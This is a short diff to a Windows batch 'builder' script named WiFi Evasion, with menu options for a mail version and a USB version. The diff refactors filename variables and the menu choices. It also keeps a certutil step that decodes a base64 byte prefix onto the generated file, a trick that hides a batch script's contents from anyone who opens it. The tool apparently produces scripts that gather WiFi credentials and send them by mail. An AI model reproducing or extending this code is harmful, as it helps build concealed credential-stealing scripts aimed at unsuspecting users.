@@ -14,9 +14,11 @@ COLOR 0B
     ECHO.
     ECHO 1) Mail Version (Requires Connection)
     ECHO 2) USB Version
-    CHOICE /C 123>NUL
+    CHOICE /C 12>NUL
     IF ERRORLEVEL 2 GOTO USB
     IF ERRORLEVEL 1 GOTO MAIL
+SET O="WiFi-Evasion-[MAIL.-VERSION].BAT"
+SET N="WiFi-Evasion-[MAIL.-VERSION]-TEMP.BAT"
 :MAIL
     CLS
     TITLE WiFi Evasion [MAIL BUILDER] - LESiO [1/5]
@@ -129,9 +131,7 @@ COLOR 0B
         ECHO ^)
         ECHO SET /A L^=^^!L^^! + 10
         ECHO EXIT /B
-    )>WiFi-Evasion-[MAIL.-VERSION].BAT
-SET O="WiFi-Evasion-[MAIL.-VERSION].BAT"
-SET N="WiFi-Evasion-[MAIL.-VERSION]-TEMP.BAT"
+    )>%O%
 COPY %O% %N%
 >"TEMP.~B64" ECHO(//4mY2xzDQo=
 CERTUTIL.EXE -F -DECODE "TEMP.~B64" "%N%"
